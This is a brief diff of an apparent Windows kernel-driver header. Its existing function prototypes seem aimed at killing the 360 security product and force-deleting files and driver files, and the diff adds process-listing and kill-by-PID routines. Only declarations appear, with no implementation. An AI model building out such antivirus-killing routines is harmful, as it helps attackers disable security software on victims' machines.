@@ -7,3 +7,5 @@ CHAR xDel1(PCSTR userPath);
 NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
 NTSTATUS kill360_64();
 NTSTATUS xDelFile3(PCHAR pAsFileName);
+NTSTATUS tasklist_user(PCHAR buff, size_t buffLength);
+NTSTATUS xkill3(DWORD dwPid);
